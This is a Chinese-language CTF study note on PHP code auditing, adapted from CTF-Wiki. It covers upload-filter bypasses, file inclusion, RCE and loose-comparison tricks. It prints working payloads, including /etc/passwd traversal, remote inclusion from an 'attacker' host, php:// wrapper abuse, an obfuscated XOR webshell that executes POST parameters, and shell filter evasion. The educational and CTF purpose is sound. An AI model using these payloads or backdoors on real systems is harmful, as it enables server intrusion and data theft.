---
title: PHP代码审计
date: 2025-11-08 21:59:32
tags:
index_img: https://pic1.imgdb.cn/item/690c233e3203f7be00db6444.png
categories: CTF
---

## 文件上传漏洞

#### 绕过上传检查

- 前端检查扩展名

  抓包绕过即可。

- `Content-Type` 检测文件类型

  抓包修改 `Content-Type` 类型，使其符合白名单规则。

- 服务端添加后缀

  尝试 `%00` 截断。

- 服务端扩展名检测

  利用解析漏洞。

- Apache 解析

  Apache 对后缀解析是从右向左的

  `phpshell.php.rar.rar.rar.rar` 因为 Apache 不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个 PHP 文件。

- IIS 解析

  IIS 6 下当文件名为 `abc.asp;xx.jpg` 时，会将其解析为 `abc.asp`。

- PHP CGI 路径解析

  当访问 `http://www.a.com/path/test.jpg/notexist.php` 时，会将 `test.jpg` 当做 PHP 解析， `notexist.php` 是不存在的文件。此时 Nginx 的配置如下

  ```nginx
  location ~ \.php$ {
    root html;
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_index index.php;
    fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
    include fastcgi_param;
  }
  ```

- 其他方式

  后缀大小写、双写、特殊后缀如 `php5` 等，修改包内容的大小写过 WAF 等。

[文件上传漏洞（全网最详细）](https://blog.csdn.net/m0_59598029/article/details/138793923)

[文件上传之 .htaccess文件getshell](https://blog.csdn.net/weixin_46684578/article/details/119141109)

[文件上传漏洞之MIME type验证原理和绕过](https://blog.csdn.net/lza20001103/article/details/124427171)



## 文件包含漏洞

常见的导致文件包含的函数有：

- PHP：`include()`，`include_once()`，`require()`，`require_once()`，`fopen()`，`readfile()` 等
- JSP Servlet：`ava.io.File()`，`java.io.FileReader()` 等
- ASP：`includefile`，`includevirtual` 等

当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。

#### 本地文件包含

本地文件包含，Local File Inclusion，LFI。

```php
<?php
$file = $_GET['file'];
if (file_exists('/home/wwwrun/'.$file.'.php')) {
  include '/home/wwwrun/'.$file.'.php';
}
?>
```

上述代码存在本地文件包含，可用 %00 截断的方式读取 `/etc/passwd` 文件内容。

- `%00` 截断

  ```
  ?file=../../../../../../../../../etc/passwd%00
  ```

  需要 `magic_quotes_gpc=off`，PHP 小于 5.3.4 有效。

- 路径长度截断

  ```
  ?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
  ```

  Linux 需要文件名长于 4096，Windows 需要长于 256。

[本地文件包含漏洞详解与CTF实战 ](https://www.cnblogs.com/xinghaihe/p/18416524)

[伪协议过滤绕过](/html/taishan.html)

#### 远程文件包含

```php
<?php
if ($route == "share") {
  require_once $basePath . "/action/m_share.php";
} elseif ($route == "sharelink") {
  require_once $basePath . "/action/m_sharelink.php";
}
```

构造变量 `basePath` 的值。

```
/?basePath=http://attacker/phpshell.txt?
```

最终的代码执行了

```php
require_once "http://attacker/phpshell.txt?/action/m_share.php";
```

问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。

![](https://pic1.imgdb.cn/item/693d6f5ffe7cfeca3822eec5.png)

- 普通远程文件包含

  ```
  ?file=[http|https|ftp]://example.com/shell.txt
  ```

  需要 `allow_url_fopen=On` 并且 `allow_url_include=On` 。

- 利用 PHP 流 input

  ```
  ?file=php://input
  ```

  需要 `allow_url_include=On` 。

- 利用 PHP 流 filter

  ```
  ?file=php://filter/convert.base64-encode/resource=index.php
  ```

  需要 `allow_url_include=On` 。

- 利用 data URIs

  ```
  ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
  ```

  需要 `allow_url_include=On` 。

- 利用 XSS 执行

  ```
  ?file=http://127.0.0.1/path/xss.php?xss=phpcode
  ```

  需要 `allow_url_fopen=On`，`allow_url_include=On` 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。
  

[**PHP伪协议详解**](https://konwait12.github.io/my-kon-blog/posts/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/)



## RCE

### 直接执行代码 

PHP 中有不少可以直接执行代码的函数。

```
eval();
assert();
system();
exec();
shell_exec();
passthru();
escapeshellcmd();
pcntl_exec();
......
```

### `preg_replace()` 代码执行

`preg_replace()` 的第一个参数如果存在 `/e` 模式修饰符，则允许代码执行。

```php
<?php
$var = "<tag>phpinfo()</tag>";
preg_replace("/<tag>(.*?)<\/tag>/e", "addslashes(\\1)", $var);
?>
```

如果没有 `/e` 修饰符，可以尝试 %00 截断。

### `preg_match` 代码执行

`preg_match` 执行的是匹配正则表达式，如果匹配成功，则允许代码执行。

```
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(strlen($code)>40){
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  "php function getFlag() to get flag";
?>
```

<details>
<summary>点击这里展开详细内容</summary>
<p>这道题是 <code>xman</code> 训练赛的时候，梅子酒师傅出的一道题。这一串代码描述是这样子，我们要绕过 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 <code>a-z</code> 中任意一个字符，并且字符串长度小于 <code>40</code> 。然后再利用 <code>PHP</code> 允许动态函数执行的特点，拼接出一个函数名，这里我们是 <code>getFlag</code>，然后动态执行该代码即可。</p>
<p>那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到 <code>getFlag</code> 函数，然后拿到 <code>webshell</code> 。</p>
<p>在理解这个之前，我们首先需要大家了解的是 <code>PHP</code> 中异或 <code>^</code> 的概念。</p>
<p>我们先看一下下面这段代码：</p>
<pre><code>&lt;?php
    echo &quot;A&quot;^&quot;?&quot;;
?&gt;
</code></pre>
<p>运行结果如下：</p>
<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer1.png"></p>
<p>我们可以看到，输出的结果是字符 <code>~</code>。之所以会得到这样的结果，是因为代码中对字符 <code>A</code> 和字符 <code>?</code> 进行了异或操作。在 <code>PHP</code> 中，两个变量进行异或时，先会将字符串转换成 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成二进制再进行异或，异或完，又将结果从二进制转换成了 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成字符串。异或操作有时也被用来交换两个变量的值。</p>
<p>比如像上面这个例子</p>
<p><code>A</code> 的 <code>ASCII</code> 值是 <code>65</code> ，对应的二进制值是 <code>01000001</code></p>
<p><code>?</code> 的ASCII值是 <code>63</code> ，对应的二进制值是 <code>00111111</code></p>
<p>异或的二进制的值是 <code>‭01111110‬</code> ，对应的 <code>ASCII</code> 值是 <code>126</code> ，对应的字符串的值就是 <code>~</code> 了</p>
<p>我们都知道， <code>PHP</code> 是弱类型的语言，也就是说在 <code>PHP</code> 中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于 <code>PHP</code> 弱类型的这个特点，我们对 <code>PHP</code> 的变量类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p>
<pre><code>&lt;?php
    function B(){
        echo &quot;Hello Angel_Kitty&quot;;
    }
    $_++;
    $__= &quot;?&quot; ^ &quot;}&quot;;
    $__();
?&gt;
</code></pre>
<p>代码执行结果如下：</p>
<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer2.png"></p>
<p>我们一起来分析一下上面这段代码：</p>
<p>1、<code>$_++;</code> 这行代码的意思是对变量名为 <code>&quot;_&quot;</code> 的变量进行自增操作，在 <code>PHP</code> 中未定义的变量默认值 <code>null</code> ，<code>null==false==0</code> ，我们可以在不使用任何数字的情况下，通过对未定义变量的自增操作来得到一个数字。</p>
<p>2、<code>$__=&quot;?&quot; ^ &quot;}&quot;;</code> 对字符 <code>?</code> 和 <code>}</code> 进行异或运算，得到结果 <code>B</code> 赋给变量名为 <code>__</code> (两个下划线)的变量</p>
<p>3、<code>$ __ ();</code> 通过上面的赋值操作，变量 <code>$__</code> 的值为 <code>B</code> ，所以这行可以看作是 <code>B()</code> ，在 <code>PHP</code> 中，这行代码表示调用函数 <code>B</code> ，所以执行结果为 <code>Hello Angel_Kitty</code> 。在 <code>PHP</code> 中，我们可以将字符串当作函数来处理。</p>
<p>看到这里，相信大家如果再看到类似的 <code>PHP</code> 后门应该不会那么迷惑了，你可以通过一句句的分析后门代码来理解后门想实现的功能。</p>
<p>我们希望使用这种后门创建一些可以绕过检测的并且对我们有用的字符串，如 <code>_POST</code> ， <code>system</code> ， <code>call_user_func_array</code>，或者是任何我们需要的东西。</p>
<p>下面是个非常简单的非数字字母的 <code>PHP</code> 后门：</p>
<pre><code>&lt;?php
    @$_++; // $_ = 1
    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _
    $__.=(&quot;.&quot;^&quot;~&quot;); // _P
    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO
    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS
    $__.=(&quot;{&quot;^&quot;/&quot;); // _POST 
    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
?&gt;
</code></pre>
<p>在这里我说明下， <code>.=</code> 是字符串的连接，具体参看 <code>PHP</code> 语法</p>
<p>我们甚至可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：</p>
<pre><code>$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);
</code></pre>
<p>我们回到 <code>xman</code> 训练赛的那题来看，我们的想法是通过构造异或来去绕过那串字符，那么我们该如何构造这个字串使得长度小于 <code>40</code> 呢？</p>
<p>我们最终是要读取到那个 <code>getFlag</code> 函数，我们需要构造一个 <code>_GET</code> 来去读取这个函数，我们最终构造了如下字符串：</p>
<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/payloads.png"></p>
<p>可能很多小伙伴看到这里仍然无法理解这段字符串是如何构造的吧，我们就对这段字符串进行段分析。</p>
<h4>构造 <code>_GET</code> 读取</h4>
<p>首先我们得知道 <code>_GET</code> 由什么异或而来的，经过我的尝试与分析，我得出了下面的结论：</p>
<pre><code>&lt;?php
    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET
?&gt;
</code></pre>
<p>这段代码一大坨是啥意思呢？因为40个字符长度的限制，导致以前逐个字符异或拼接的webshell不能使用。<br/>这里可以使用php中可以执行命令的反引号 <code>`</code> 和 <code>Linux</code> 下面的通配符 <code>?</code></p>
<ul>
<li><code>?</code> 代表匹配一个字符</li>
<li><code>`</code> 表示执行命令</li>
<li><code>&quot;</code> 对特殊字符串进行解析</li>
    <p>由于 <code>?</code> 只能匹配一个字符，这种写法的意思是循环调用，分别匹配。我们将其进行分解来看：</p>
<pre><code>&lt;?php
    echo &quot;{&quot;^&quot;&lt;&quot;;
?&gt;
</code></pre>
<p>输出结果为：</p>
<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer3.png"></p>
<pre><code>&lt;?php
    echo &quot;{&quot;^&quot;&gt;&quot;;
?&gt;
</code></pre>
<p>输出结果为：</p>
<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer4.png"></p>
<pre><code>&lt;?php
    echo &quot;{&quot;^&quot;/&quot;;
?&gt;
</code></pre>
<p>输出结果为：</p>
<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer5.png"></p>
<p>所以我们可以知道， <code>_GET</code> 就是这么被构造出来的啦！</p>
<h4>获取 <code>_GET</code> 参数</h4>
<p>我们又该如何获取 <code>_GET</code> 参数呢？咱们可以构造出如下字串：</p>
<pre><code>&lt;?php
    echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__])
?&gt;
</code></pre>
<p>根据前面构造的来看， <code>$_</code> 已经变成了 <code>_GET</code> 。顺理成章的来讲， <code>$_ = _GET</code> 。我们构建 <code>$_GET[__]</code> 是为了要获取参数值。</p>
<h4>传入参数</h4>
<p>此时我们只需要去调用 <code>getFlag</code> 函数获取 <code>webshell</code> 就好了，构造如下：</p>
<pre><code>&lt;?php
    echo $_=getFlag;//getFlag
?&gt;
</code></pre>
<p>所以把参数全部连接起来，就可以了。</p>
<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/payloads.png"></p>
<p>结果如下：</p>
<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/flag.png"></p>
<p>于是我们就成功地读取到了flag！</p></details>



### 动态函数执行

用户自定义的函数可以导致代码执行。

```php
<?php
$dyn_func = $_GET["dyn_func"];
$argument = $_GET["argument"];
$dyn_func($argument);
?>
```

### 反引号命令执行

```php
<?php
echo `ls -al`;
?>
```

### Curly Syntax

PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。

```php
<?php
$var = "aaabbbccc ${`ls`}";
?>
<?php
$foobar = "phpinfo";
${"foobar"}();
?>
```

### 回调函数

很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。

```php
<?php
$evil_callback = $_GET["callback"];
$some_array = array(0,1,2,3);
$new_array = array_map($evil_callback, $some_array);
?>
```

攻击 payload

```
http://www.a.com/index.php?callback=phpinfo
```

### 反序列化

咕咕咕~



## PHP 特性

### 数组

```php
<?php
$var = 1;
$var = array();
$var = "string";
?>
```

php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。

比如在 `$a == $b` 的比较中

```php
$a = null; 
$b = false; //为真 
$a = ''; 
$b = 0; //同样为真
```

然而，PHP 内核的开发者原本是想让程序员借由这种不需要声明的体系，更加高效的开发，所以在几乎所有内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。

```php
0=='0' //true
0 == 'abcdefg' //true
0 === 'abcdefg' //false
1 == '1abcdef' //true
```

### 魔法 Hash

```php
"0e132456789"=="0e7124511451155" //true
"0e123456abc"=="0e1dddada" //false
"0e1abc"=="0"  //true
```

在进行比较运算时，如果遇到了 `0e\d+` 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 `0e\d+` 这种模式就不会相等。

### 十六进制转换

```php
"0x1e240"=="123456" //true
"0x1e240"==123456 //true
"0x1e240"=="1e240" //false
```

当其中的一个字符串是 `0x` 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，`0x1240` 解析成为十进制就是 123456，所以与 `int` 类型和 `string` 类型的 123456 比较都是相等。

### 类型转换

常见的转换主要就是 `int` 转换为 `string`，`string` 转换为 `int`。

`int` 转 `string`

```php
$var = 5;
方式1：$item = (string)$var;
方式2：$item = strval($var);
```

`string` 转 `int`：`intval()` 函数。

对于这个函数，可以先看 2 个例子。

```php
var_dump(intval('2')) //2
var_dump(intval('3abcd')) //3
var_dump(intval('abcd')) //0
```

说明 `intval()` 转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串， `intval()` 不会报错而是返回 0。

同时，程序员在编程的时候也不应该使用如下的这段代码：

```php
if(intval($a)>1000) {
 mysql_query("select * from news where id=".$a)
}
```

这个时候 `$a` 的值有可能是 `1002 union`。

### 内置函数的参数的松散性

内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。

**md5()**

```php
$array1[] = array(
 "foo" => "bar",
 "bar" => "foo",
);
$array2 = array("foo", "bar", "hello", "world");
var_dump(md5($array1)==md5($array2)); //true
```

PHP 手册中的 md5（）函数的描述是 `string md5 ( string $str [, bool $raw_output = false ] )`，`md5()` 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，`md5()` 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。

**strcmp()**

`strcmp()` 函数在 PHP 官方手册中的描述是 `intstrcmp ( string $str1 ， string $str2 )`，需要给 `strcmp()` 传递 2 个 `string` 类型的参数。如果 `str1` 小于 `str2`，返回 -1，相等返回 0，否则返回 1。`strcmp()` 函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。

如果传入给出 `strcmp()` 的参数是数字呢？

```php
$array=[1,2,3];
var_dump(strcmp($array,'123')); //null,在某种意义上null也就是相当于false。
```

**switch()**

如果 `switch()` 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：

```php
$i ="2abc";
switch ($i) {
case 0:
case 1:
case 2:
 echo "i is less than 3 but not negative";
 break;
case 3:
 echo "i is 3";
}
```

这个时候程序输出的是 `i is less than 3 but not negative` ，是由于 `switch()` 函数将 `$i` 进行了类型转换，转换结果为 2。

**in_array()**

在 PHP 手册中， `in_array()` 函数的解释是 `bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` ,如果strict参数没有提供，那么 `in_array` 就会使用松散比较来判断 `$needle` 是否在 `$haystack` 中。当 strict 的值为 true 时， `in_array()` 会比较 needls 的类型和 haystack 中的类型是否相同。

```php
$array=[0,1,2,'3'];
var_dump(in_array('abc', $array)); //true
var_dump(in_array('1bc', $array)); //true
```

可以看到上面的情况返回的都是 true，因为 `'abc'` 会转换为 0， `'1bc'` 转换为 1。

`array_search()` 与 `in_array()` 也是一样的问题。



## 小芝士

#### linux命令

##### cat被过滤

- `tac` 是一个常用的文本处理命令，核心功能是 **反向输出文件内容**
- `more` 命令是 Linux 系统中用于分页显示文件内容的工具，在处理篇幅较长的文本文件时非常实用
- `less，tail，head`

##### 空格绕过

<、>、${IFS}、$IFS、$IFS$9

[CTF中的命令执行绕过方式](https://blog.csdn.net/2401_84466223/article/details/139408099)

#### php命令

```
code=eval(array_pop(next(get_defined_vars())));&1=phpinfo();
```



<p class="note note-success">本文摘自CTF-Wiki，原文基础上有改动</p>

